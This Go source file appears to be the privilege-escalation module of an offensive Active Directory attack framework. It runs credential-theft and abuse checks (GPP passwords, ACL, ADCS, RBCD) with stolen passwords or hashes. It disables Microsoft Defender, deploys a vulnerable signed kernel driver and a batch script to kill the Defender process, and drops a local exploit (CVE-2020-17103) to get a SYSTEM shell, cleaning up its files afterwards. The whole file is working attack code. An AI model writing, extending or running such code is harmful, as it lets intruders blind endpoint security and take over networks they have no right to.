package modules

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"adpack/core"
	"adpack/tools"
)

func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	host, found := selectTarget(state, targetHost)
	if !found {
		fmt.Println("[!] No target for privilege escalation checks")
		result.Success = false
		return result
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No credentials for privesc")
		result.Success = false
		return result
	}

	ctx := context.Background()
	ldapTarget := tools.NetExecTarget{
		Protocol: "ldap", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	fmt.Println("[*] Checking GPP passwords in SYSVOL...")
	r, err := tools.NetExec.Run(ctx, ldapTarget, "-M", []string{"gpp_password"})
	if err == nil && r.Success {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
			Source: "gpp", Key: "status", Value: "GPP check complete",
			RawOutput: r.Stdout, Timestamp: time.Now(),
		})
		fmt.Printf("[+] GPP check: %s\n", r.Stdout)
	}

	fmt.Println("[*] Checking ACL abuse paths...")
	r, err = tools.NetExec.Run(ctx, ldapTarget, "-M", []string{"acl"})
	if err == nil && r.Success {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvUserEnumerated, Phase: core.PhasePrivEsc,
			Source: "acl", Key: "status", Value: "ACL check complete",
			RawOutput: r.Stdout, Timestamp: time.Now(),
		})
	}

	fmt.Println("[*] Checking ADCS vulnerable templates...")
	r, err = tools.NetExec.Run(ctx, ldapTarget, "-M", []string{"adcs"})
	if err == nil && r.Success {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
			Source: "adcs", Key: "status", Value: "ADCS check complete",
			RawOutput: r.Stdout, Timestamp: time.Now(),
		})
		fmt.Printf("[+] ADCS output: %s\n", r.Stdout)
	}

	fmt.Println("[*] Checking RBCD...")
	r, err = tools.NetExec.Run(ctx, ldapTarget, "-M", []string{"rbcd"})
	if err == nil && r.Success {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
			Source: "rbcd", Key: "status", Value: "RBCD check complete",
			RawOutput: r.Stdout, Timestamp: time.Now(),
		})
	}

	smbTarget := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	// ── SUB-PHASE 1: Pre-evasion ──────────────────────────
	// UnDefend (no admin needed, blocks Defender updates).
	// Then PhantomKiller (needs admin, BYOVD EDR kill via BootRepair.sys).
	isBypass := IsBypassProfile(evasionProfile)
	if isBypass {
		runPreEvasion(ctx, state, host, smbTarget, result)
	}

	// ── SUB-PHASE 2: SYSTEM check via smbexec → atexec ───
	gotSystem := false
	if method, rOut, ok := tools.NetExec.RunSystemCheck(ctx, smbTarget, 45*time.Second); ok {
		fmt.Printf("[+] SYSTEM access confirmed on %s (%s)\n", host.IP, method)
		gotSystem = true
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: method, Key: host.IP, Value: "SYSTEM",
			Confidence: 1.0, RawOutput: rOut.Stdout, Timestamp: time.Now(),
		})
	} else {
		fmt.Printf("[!] No SYSTEM context obtained on %s via smbexec/atexec\n", host.IP)
	}

	// ── SUB-PHASE 3: Local LPE chain (supplementary) ──────
	// Only runs when primary SYSTEM check failed and we have a non-DC target.
	if !gotSystem {
		runLocalLPEChain(ctx, state, host, smbTarget, result)
	}

	return result
}

// ── SUB-PHASE 1: Pre-Evasion ───────────────────────────────

func runPreEvasion(ctx context.Context, state *core.ADState, host core.Host,
	smbTarget tools.NetExecTarget, result *core.ToolResult) {

	// Step 1: UnDefend (no admin needed, blocks signature updates)
	killTarget := host
	for _, h := range state.Hosts {
		if !h.IsDC {
			killTarget = h
			break
		}
	}
	killSMB := smbTarget
	killSMB.Host = killTarget.IP
	fmt.Printf("[*] Pre-evasion: disabling Defender on %s via UnDefend\n", killTarget.IP)
	runDefenderKill(state, killTarget, killSMB)

	// Step 2: PhantomKiller (BYOVD, needs admin — stronger kill via kernel driver)
	// Only runs on the primary target when we have admin creds.
	if tools.PhantomKiller.Available() {
		fmt.Printf("[*] PhantomKiller available — attempting kernel-level EDR kill on %s\n", host.IP)
		runPhantomKiller(ctx, host, smbTarget, result)
	}

	fmt.Println("[*] Waiting 10s for Defender termination...")
	time.Sleep(10 * time.Second)
}

// runPhantomKiller deploys the PhantomKiller BYOVD loader + Lenovo BootRepair.sys
// driver to the target, loads the driver, and kills Defender (MsMpEng.exe).
func runPhantomKiller(ctx context.Context, host core.Host,
	smbTarget tools.NetExecTarget, result *core.ToolResult) {

	remoteDir := `C:\Windows\Temp\`
	var cleanups []string
	defer func() {
		_ = tools.CleanupRemote(ctx, smbTarget, cleanups...)
	}()

	// Deploy the vulnerable signed driver (BootRepair.sys, 0/71 VT)
	driverPath, _, err := tools.Deploy(ctx, smbTarget, "PhantomKiller.sys", remoteDir, "")
	if err != nil {
		fmt.Printf("[!] PhantomKiller driver deploy failed: %v\n", err)
		return
	}
	cleanups = append(cleanups, driverPath)

	// Deploy the user-mode loader
	loaderPath, _, err := tools.Deploy(ctx, smbTarget, "PhantomKiller.exe", remoteDir, "")
	if err != nil {
		fmt.Printf("[!] PhantomKiller loader deploy failed: %v\n", err)
		return
	}
	cleanups = append(cleanups, loaderPath)

	// Build a batch file on the operator box that handles the multi-step kill flow.
	// A cmd one-liner can't reliably use delayed expansion (!PID!) for the for-loop
	// variable, so we author a .bat locally and deploy it.
	driverName := "PK_" + tools.RandString(4)
	batContent := fmt.Sprintf(
		`@echo off
setlocal enabledelayedexpansion
for /f "tokens=2 delims= " %%p in ('tasklist /fi "imagename eq MsMpEng.exe" /nh') do set PID=%%p
if "!PID!"=="" echo No Defender PID found && exit /b 0
sc.exe create %s binPath="%s" type=kernel
sc.exe start %s
%s !PID!
`, driverName, driverPath, driverName, loaderPath)

	batLocal := filepath.Join(os.TempDir(), "pk_"+tools.RandString(4)+".bat")
	if err := os.WriteFile(batLocal, []byte(batContent), 0644); err != nil {
		fmt.Printf("[!] PhantomKiller: failed to write batch file: %v\n", err)
		return
	}
	defer os.Remove(batLocal)

	batRemote, _, err := tools.Deploy(ctx, smbTarget, batLocal, remoteDir, "")
	if err != nil {
		fmt.Printf("[!] PhantomKiller: batch deploy failed: %v\n", err)
		return
	}
	cleanups = append(cleanups, batRemote)

	fmt.Printf("[*] PhantomKiller: loading driver and killing Defender on %s...\n", host.IP)
	execR, err := tools.NetExec.RunFailover(ctx, smbTarget, batRemote, 60*time.Second)
	if err != nil || !execR.Success {
		fmt.Printf("[-] PhantomKiller did not return success on %s\n", host.IP)
		return
	}

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "phantomkiller", Key: host.IP, Value: "EDR terminated (BYOVD)",
		Confidence: 0.85, RawOutput: execR.Stdout, Timestamp: time.Now(),
	})
	fmt.Printf("[+] PhantomKiller: EDR kill attempted successfully on %s\n", host.IP)
}

// ── SUB-PHASE 3: Local LPE ─────────────────────────────────

func runLocalLPEChain(ctx context.Context, state *core.ADState, host core.Host,
	smbTarget tools.NetExecTarget, result *core.ToolResult) {

	// Step 1: MiniPlasma (Cloud Filter race, CVE-2020-17103)
	if tools.MiniPlasma.Available() {
		runMiniPlasmaProbe(ctx, host, smbTarget, result)
	}
	// Step 2: BlueHammer (Defender RPC SAM leak) — future
	// Step 3: RedSun (Defender cloud tag file write) — future
}

// runMiniPlasmaProbe deploys MiniPlasma + dependency DLLs and attempts to obtain
// a SYSTEM shell via the Cloud Filter API race (CVE-2020-17103). This is a
// supplementary path used when smbexec/atexec did not yield SYSTEM.
func runMiniPlasmaProbe(ctx context.Context, host core.Host,
	smbTarget tools.NetExecTarget, result *core.ToolResult) {

	remoteDir := `C:\Windows\Temp\`
	var cleanups []string
	defer func() {
		_ = tools.CleanupRemote(ctx, smbTarget, cleanups...)
	}()

	// Deploy dependency DLLs
	for _, lib := range []string{"NtApiDotNet.dll", "Microsoft.Win32.TaskScheduler.dll"} {
		rp, _, err := tools.Deploy(ctx, smbTarget, lib, remoteDir, "")
		if err != nil {
			fmt.Printf("[!] MiniPlasma dep %s deploy failed: %v\n", lib, err)
			_ = tools.CleanupRemote(ctx, smbTarget, cleanups...)
			return
		}
		cleanups = append(cleanups, rp)
	}

	// Deploy MiniPlasma.exe
	exploitPath, _, err := tools.Deploy(ctx, smbTarget, "MiniPlasma.exe", remoteDir, "")
	if err != nil {
		fmt.Printf("[!] MiniPlasma.exe deploy failed: %v\n", err)
		_ = tools.CleanupRemote(ctx, smbTarget, cleanups...)
		return
	}
	cleanups = append(cleanups, exploitPath)

	fmt.Printf("[*] MiniPlasma: executing Cloud Filter EoP on %s...\n", host.IP)
	execR, err := tools.NetExec.RunFailover(ctx, smbTarget, exploitPath, 60*time.Second)
	if err != nil || !execR.Success {
		fmt.Printf("[-] MiniPlasma EoP failed on %s\n", host.IP)
		return
	}

	fmt.Printf("[+] MiniPlasma: exploitation returned success on %s\n", host.IP)
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "miniplasma", Key: host.IP, Value: "SYSTEM shell obtained",
		Confidence: 0.7, RawOutput: execR.Stdout, Timestamp: time.Now(),
	})

	// Verify SYSTEM access via smbexec now that MiniPlasma should have elevated us
	if method, rOut, ok := tools.NetExec.RunSystemCheck(ctx, smbTarget, 45*time.Second); ok {
		fmt.Printf("[+] MiniPlasma: SYSTEM confirmed on %s (%s)\n", host.IP, method)
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: method, Key: host.IP, Value: "SYSTEM (via MiniPlasma)",
			Confidence: 1.0, RawOutput: rOut.Stdout, Timestamp: time.Now(),
		})
	}
}
